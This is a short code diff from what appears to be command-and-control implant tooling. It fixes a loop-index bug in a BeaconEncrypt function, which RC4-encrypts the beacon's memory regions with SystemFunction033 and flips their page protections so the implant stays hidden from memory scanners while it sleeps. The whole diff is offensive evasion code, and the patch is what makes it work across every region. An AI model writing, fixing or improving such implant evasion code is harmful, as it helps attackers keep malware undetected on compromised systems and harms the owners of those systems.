@@ -818,9 +818,9 @@ VOID BeaconEncrypt(BOOL fEncrypt) {
 
         for (SIZE_T i = 0; i < g_dwBeaconBlocks; i++)
         {
-            VirtualProtect(orgs[g_dwBeaconBlocks].BaseAddress, orgs[g_dwBeaconBlocks].RegionSize, PAGE_READWRITE, &dwOld);
-            g_data.Buffer = (PUCHAR)orgs[g_dwBeaconBlocks].BaseAddress;
-            g_data.Length = orgs[g_dwBeaconBlocks].RegionSize;
+            VirtualProtect(orgs[i].BaseAddress, orgs[i].RegionSize, PAGE_READWRITE, &dwOld);
+            g_data.Buffer = (PUCHAR)orgs[i].BaseAddress;
+            g_data.Length = orgs[i].RegionSize;
             SystemFunction033(&g_data, &g_key);
         }
     }
@@ -829,10 +829,10 @@ VOID BeaconEncrypt(BOOL fEncrypt) {
     {
         for (SIZE_T i = 0; i < g_dwBeaconBlocks; i++)
         {
-            g_data.Buffer = (PUCHAR)orgs[g_dwBeaconBlocks].BaseAddress;
-            g_data.Length = orgs[g_dwBeaconBlocks].RegionSize;
+            g_data.Buffer = (PUCHAR)orgs[i].BaseAddress;
+            g_data.Length = orgs[i].RegionSize;
             SystemFunction033(&g_data, &g_key);
-            VirtualProtect(orgs[g_dwBeaconBlocks].BaseAddress, orgs[g_dwBeaconBlocks].RegionSize, orgs[g_dwBeaconBlocks].Protect, &dwOld);
+            VirtualProtect(orgs[i].BaseAddress, orgs[i].RegionSize, orgs[i].Protect, &dwOld);
         }
         g_dwBeaconBlocks = 0;
     }
